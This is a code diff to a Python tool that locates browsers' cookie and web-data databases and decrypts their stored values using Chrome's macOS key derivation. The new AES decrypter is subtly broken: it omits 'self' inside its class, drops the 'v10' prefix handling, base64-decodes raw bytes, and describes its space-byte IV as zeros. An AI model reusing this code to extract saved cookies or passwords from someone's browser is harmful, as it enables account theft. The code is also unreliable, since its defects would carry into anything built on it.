@@ -16,6 +16,7 @@ import sqlite3
 import string
 import sys
 import tempfile
+from Crypto.Cipher import AES
 
 DEBUG = False
 
@@ -92,26 +93,30 @@ class Broswer:
                 self.web_path.append({browser_name: web_data})
             if cookies_data:
                 self.cookies_path.append({browser_name: cookies_data})
-                
-    def decrypter(self, cipher_text, key):
-        
-        #print_debug(f"[+] decrypting {cipher_text} and  key is {key}")
-        cipher_text_encoded = base64.b64encode(cipher_text[3:])
-        iv = ''.join(('20', '20', '20', '20', '20', '20', '20', '20', '20', '20',
-                         '20', '20', '20', '20', '20', '20'))
-        key = key.encode("utf-8")
-        key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
-        key = binascii.hexlify(key)
-        
-        try:
-            cmd = f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {key.decode('utf-8')} <<< {cipher_text_encoded.decode('utf-8')} 2>/dev/null"
-            #print_debug(f"cmd={cmd}")
-            output = subprocess.check_output(cmd, shell=True)
-        except Exception as e:
-            print(f"[-] Error running the openssl command: {e}")
-            output = cipher_text
 
-        return output
+    def decrypter(cipher_text, key):
+        # Decode base64 encoded ciphertext
+        cipher_text = base64.b64decode(cipher_text)
+
+        # Correctly derive key
+        key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]
+
+        # Use a proper IV if known; here it's assumed as 16 bytes of zeros for example purposes
+        iv = bytes([0x20] * 16)  # Adjust this based on actual encryption settings
+
+        try:
+            # Initialize cipher
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+
+            # Decrypt and remove padding
+            decrypted = cipher.decrypt(cipher_text)
+            padding_length = decrypted[-1]
+            decrypted = decrypted[:-padding_length]
+
+            return decrypted.decode('utf-8')
+        except Exception as e:
+            print(f"[-] Error decrypting data: {e}")
+            return None
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
